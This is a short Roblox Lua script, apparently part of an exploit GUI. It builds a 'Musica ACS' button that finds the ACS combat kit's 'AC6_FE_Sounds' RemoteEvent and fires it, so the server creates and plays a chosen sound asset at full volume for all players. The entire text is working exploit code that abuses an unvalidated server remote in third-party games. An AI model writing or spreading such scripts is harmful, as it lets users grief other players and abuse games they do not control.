MusicaACS.Name = "Musica ACS"
MusicaACS.Parent = Frame
MusicaACS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MusicaACS.BorderColor3 = Color3.fromRGB(0, 0, 0)
MusicaACS.BorderSizePixel = 0
MusicaACS.Position = UDim2.new(0.365389168, 0, 0.514184415, 0)
MusicaACS.Size = UDim2.new(0, 133, 0, 30)
MusicaACS.Font = Enum.Font.FredokaOne
MusicaACS.Text = "Musica ACS"
MusicaACS.TextColor3 = Color3.fromRGB(0, 0, 0)
MusicaACS.TextSize = 14.000
MusicaACS.MouseButton1Down:Connect(function()

	IsPlaying = true
	local ID = "rbxassetid://6896624865"
	local Name = "xd"
	local Volume = 100
	local Pitch = 1

	for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
		if v:IsA("RemoteEvent") and v.Name == "AC6_FE_Sounds" then
			if IsPlaying == true then
				v:FireServer("newSound", Name, workspace, ID, Pitch, Volume, true)
				v:FireServer("playSound", Name)
			end 

			if IsPlaying == false then
				v:FireServer("stopSound", Name)
			end
		end
	end
end)

